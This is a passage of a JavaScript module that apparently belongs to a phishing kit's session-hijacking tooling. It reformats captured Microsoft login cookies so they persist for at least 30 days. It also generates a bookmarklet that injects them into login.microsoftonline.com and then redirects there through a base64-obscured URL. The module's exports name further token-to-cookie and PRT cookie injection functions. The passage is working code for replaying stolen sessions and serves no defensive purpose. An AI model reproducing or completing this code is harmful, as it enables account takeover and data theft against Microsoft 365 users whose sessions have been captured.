    return { success: false, error: 'No valid cookies found' };
  }
  
  const targetUrl = determineEndpoint(cookieResult.templateType || 'office');
  
  // Every cookie MUST have a concrete domain + expirationDate.
  // - domain without a leading dot = exact-host only (silently useless)
  // - expirationDate undefined      = session cookie (dies on browser close)
  // Both have been the cause of captures that "set" but never authenticate.
  const nowSec = Math.floor(Date.now() / 1000);
  const extensionCookies = structured
    .map(c => ({
      name: c.name,
      value: c.value,
      // Preserve the existing domain when present.
      // When missing, default to .login.microsoftonline.com because that is
      // where Microsoft sets ESTSAUTH / ESTSAUTHPERSISTENT during the auth
      // redirect. Falling back to .microsoftonline.com for an empty domain
      // over-scopes host-only cookies and breaks the login.microsoftonline.com
      // redirect.
      domain: c.domain && c.domain[0] === '.' ? c.domain : '.' + (c.domain || 'login.microsoftonline.com'),
      path: c.path || '/',
      secure: c.secure !== false,
      httpOnly: c.httpOnly === true,
      sameSite: c.sameSite || 'Lax',
      // 30-day floor — never emit a session cookie
      expirationDate: c.expirationDate && c.expirationDate > nowSec
        ? Math.floor(c.expirationDate)
        : nowSec + 30 * 24 * 60 * 60,
    }))
    .filter(c => c.name && c.value);
  
  // Generate bookmarklet script (document.cookie format)
  const bookmarklet = generateBookmarkletScript(extensionCookies);

  return {
    success: true,
    cookies: extensionCookies,
    cookie_count: extensionCookies.length,
    target_url: targetUrl,
    account_type: cookieResult.accountType,
    template_type: cookieResult.templateType,
    fresh: cookieResult.fresh,
    generated_at: new Date().toISOString(),
    expires_in_seconds: cookieResult.expiration ? (cookieResult.expiration - Math.floor(Date.now() / 1000)) : undefined,
    bookmarklet: bookmarklet,
  };
}

/**
 * Generate a bookmarklet-style injection script using document.cookie.
 *
 * This format is designed to be run from the browser's address bar (as a
 * bookmarklet) or devtools console while on login.microsoftonline.com.
 *
 * Key differences from the chrome.cookies.set() extension approach:
 * - Uses document.cookie (works without extension permissions)
 * - Uses domain=.login.microsoftonline.com (NOT .microsoftonline.com)
 *   because document.cookie CANNOT set parent-domain cookies
 * - Uses Max-Age=31536000 (1 year) for persistent cookies
 * - Does NOT set httpOnly (document.cookie can't do that, but it's
 *   not needed for SSO — the browser still sends the cookie)
 * - Redirects to login.microsoftonline.com after setting cookies
 *
 * LIMITATION: Must be run while on login.microsoftonline.com (or a subdomain).
 * The browser rejects document.cookie with a domain that doesn't match the
 * current page.
 *
 * @param {array} cookies - Array of cookie objects from formatCookiesForInjection
 * @returns {string} JavaScript bookmarklet code
 */
function generateBookmarkletScript(cookies) {
  if (!cookies || !cookies.length) return '';

  // Build cookie objects with the correct domain for document.cookie
  const cookieObjects = cookies.map(c => ({
    name: c.name,
    value: c.value,
    // Use .login.microsoftonline.com (NOT .microsoftonline.com) because
    // document.cookie can't set parent-domain cookies. The current page
    // must be on login.microsoftonline.com for this to work.
    domain: c.domain && c.domain.includes('login.microsoftonline.com')
      ? c.domain
      : '.login.microsoftonline.com',
    path: c.path || '/',
    secure: c.secure !== false,
    sameSite: c.sameSite || 'None',
  }));

  const cookiesJson = JSON.stringify(cookieObjects);

  // Generate the bookmarklet script
  // atob('aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29t') = https://login.microsoftonline.com
  return `!function(){let e=JSON.parse(\`${cookiesJson}\`);
for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`domain=\${o.domain};\`:""}Secure;SameSite=\${o.sameSite||'None'}\`;
window.location.href=atob('aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29t')}();`;
}

module.exports = {
  convertTokensToCookies,
  generateCookieInjectionScript,
  processCookieConversion,
  determineEndpoint,
  determineResource,
  detectAccountType,
  generateXmsRefreshTokenCredential,
  defineEndpoint: determineEndpoint,
  getStoredPrtCookie,
  refreshStoredPrtCookie,
  generatePrtCookieInjectionScript,
  generateFullInjectionScript,
  formatCookiesForInjection,
  generateExtensionData,
  generateBookmarkletScript
};
